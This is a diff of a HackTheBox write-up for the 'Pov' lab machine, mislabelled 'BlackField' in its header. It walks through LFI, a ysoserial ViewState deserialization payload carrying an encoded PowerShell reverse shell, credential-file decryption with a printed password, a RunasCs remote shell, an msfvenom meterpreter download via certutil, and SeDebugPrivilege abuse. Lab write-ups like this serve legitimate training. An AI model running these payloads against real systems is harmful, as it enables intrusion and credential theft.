@@ -1,7 +1,18 @@
-Nmap Port Scan :
+---
+title: BlackField HackTheBox Writeup 
+date: 2024-06-10
+categories: [HackTheBox]
+tags: [Pentest, HTB, CTF, OSCP]
+---
 
-```php
-❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.251 -oN ports                                                                                                 ─╯
+<figure><img src="/assets/HTB/Pov/Pov.png" alt="Banner"></figure>
+
+## Recon (10.10.11.251)
+
+### Nmap Port Scan :
+
+```terminal
+❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.251 -oN ports
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-02 22:22 IST
 Nmap scan report for 10.10.11.251
 Host is up (0.16s latency).
@@ -13,11 +24,10 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 26.61 seconds	
 ```
 
-Nmap Full Scan :
+### Nmap Full Scan :
 
-```php
-❯ nmap -p80 -sCV 10.10.11.251 --min-rate 5000 --script vuln        
-         ─╯
+```terminal
+❯ nmap -p80 -sCV 10.10.11.251 --min-rate 5000 --script vuln
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-02 22:24 IST
 Stats: 0:02:24 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
 NSE Timing: About 97.32% done; ETC: 22:26 (0:00:04 remaining)
@@ -39,8 +49,11 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 No interesting output .
 
-FFUF Scan :
-```
+## Enumeration
+
+### FFUF Scan :
+
+```terminal
 ❯ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://pov.htb/ -H 'Host: FUZZ.pov.htb' -fs 12330                                
 
 <SNIP>
@@ -51,23 +64,25 @@ dev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 1
 
 Added `dev.pov.htb` to `/etc/hosts` file.
 
-![[Pasted image 20240203003303.png]]
+<figure><img src="/assets/HTB/Pov/Pasted image 20240203003303.png" alt="Banner"></figure>
 
 This gave hint that there might be aspx files hosted on the server . Also to confirm there was a `contact.aspx`.
 
-![[Pasted image 20240203003731.png]]
+<figure><img src="/assets/HTB/Pov/Pasted image 20240203003731.png" alt="Banner"></figure>
 
-<h2> LFI </h2>
+## Exploitation 
 
-![[Pasted image 20240203004230.png]]
+### LFI
+
+<figure><img src="/assets/HTB/Pov/Pasted image 20240203004230.png" alt="Banner"></figure>
 
 I captured that request in burp :
 
-![[Pasted image 20240203005441.png]]
+<figure><img src="/assets/HTB/Pov/Pasted image 20240203005441.png" alt="Banner"></figure>
 
 In the file Param we can perform the LFI. And if we look at the response we can see that it is running older version of AspNet
 
-![[Pasted image 20240203005614.png]]
+<figure><img src="/assets/HTB/Pov/Pasted image 20240203005614.png" alt="Banner"></figure>
 
 After looking at the parameters and the ASP Net version. I found this vuln :
 https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-knowing-the-secret
@@ -93,13 +108,13 @@ Using lfi , I first read the web.config file, which gave the hint for the above 
 
 Using `ysoserial.exe` I generated a payload :
 
-```bash
+```terminal
 .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AOAAiACwAMQAzADMANwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=" --path="/portfolio/default.aspx" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
 ```
  Copied the output and sent in the  `__VIEWSTATE` parameter :
 
 
-```bash
+```terminal
 POST /portfolio/default.aspx HTTP/1.1
 Host: dev.pov.htb
 Content-Length: 3505
@@ -119,7 +134,14 @@ __EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=c32YwH4yzbD1K5CIy0V1%2BedcnI
 
 Got shell connected as user sfitz
 
-![[Pasted image 20240203012013.png]]
+<figure><img src="/assets/HTB/Pov/Pasted image 20240203012013.png" alt="Banner"></figure>
+
+## User
+
+### PS Credential File 
+
+* PS credentials are often used for scripting tasks as a way to store encrypted credentials conveniently.  The Credentials are protected using `DPAPI`, which can only be decrypted by the `same user` on the `same computer` they were created on.
+
 
 In the sfitz's document directory I saw xml file which had the SecureString Password :
 
@@ -138,55 +160,64 @@ In the sfitz's document directory I saw xml file which had the SecureString Pass
   </Obj>
 </Objs>
 ```
-![[Pasted image 20240203012545.png]]
+<figure><img src="/assets/HTB/Pov/Pasted image 20240203012545.png" alt="Banner"></figure>
 
 To decrypt it , I used powershell function :
 
-```
+```terminal
 $Credential = Import-Clixml -Path c:\users\sfitz\documents\connection.xml
 $Credential.UserName
 $Credential.GetNetWorkCredential().password
 ```
 
 This got us the password for the user 
-![[Pasted image 20240203012755.png]]
+<figure><img src="/assets/HTB/Pov/Pasted image 20240203012755.png" alt="Banner"></figure>
 
-```alaading:f8gQ8fynP44ek1m3```
+```terminal
+alaading:f8gQ8fynP44ek1m3
+```
 
-Reading User.txt using runas command 
+Reading User.txt using RunasCs binary. 
 
-```.\runas.exe alaading f8gQ8fynP44ek1m3 "cmd /c type C:\Users\alaading\Desktop\user.txt" ```
-![[Pasted image 20240203012925.png]]
+```terminal
+.\runas.exe alaading f8gQ8fynP44ek1m3 "cmd /c type C:\Users\alaading\Desktop\user.txt"
+```
 
-To get shell as user <b>allading </b>  I used runas to remotely execute the command.
+<figure><img src="/assets/HTB/Pov/Pasted image 20240203012925.png" alt="Banner"></figure>
 
-```.\runas.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.16.8:7143```
+### Lateral Movement
+
+Still we don't have a interative shell for that user. To get shell as user <b>allading </b>  I used runas to remotely execute the command.
+
+```terminal
+.\runas.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.16.8:7143
+```
 
 This command remotely started the process and we got the shell as user **alaading**
 
-![[Pasted image 20240203144640.png]]
+<figure><img src="/assets/HTB/Pov/Pasted image 20240203144640.png" alt="Banner"></figure>
 
 We can see that we have SeDebugPrivilege
 
 I created one more meterpreter payload :
 
-```c
+```terminal
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=7143 -f exe > rev.exe
 ```
 
 Moved it to `C:\Users\alaadin\Documents` using certutil :
 
-```php
+```terminal
 certutil -urlcache -f http://10.10.16.8/rev.exe rev.exe
 ```
 
 Then ran rev.exe and got the shell on meterpreter :
 
-![[Pasted image 20240203150205.png]]
+<figure><img src="/assets/HTB/Pov/Pasted image 20240203150205.png" alt="Banner"></figure>
 
-## Abusing SeDebugPrivileges
+## Administrator 
 
-### Tranferring files :
+### Abusing SeDebugPrivileges :
 
 
 |**Filename** | Links|
@@ -195,15 +226,15 @@ Then ran rev.exe and got the shell on meterpreter :
 
 Now using `certutil` the ps script is transferred.
 
-![[Pasted image 20240203152238.png]]
+<figure><img src="/assets/HTB/Pov/Pasted image 20240203152238.png" alt="Banner"></figure>
 
 1.  First `ps` to check all the process which is running as `system`
 2. Lookout for `winlogon.exe`
 3. copy the pid and run `migrate <pid>` 
 4. run shell
 
-![[Pasted image 20240203152543.png]]
+<figure><img src="/assets/HTB/Pov/Pasted image 20240203152543.png" alt="Banner"></figure>
 
 type root.txt
 
-![[Pasted image 20240203152624.png]]
+<figure><img src="/assets/HTB/Pov/Pasted image 20240203152624.png" alt="Banner"></figure>
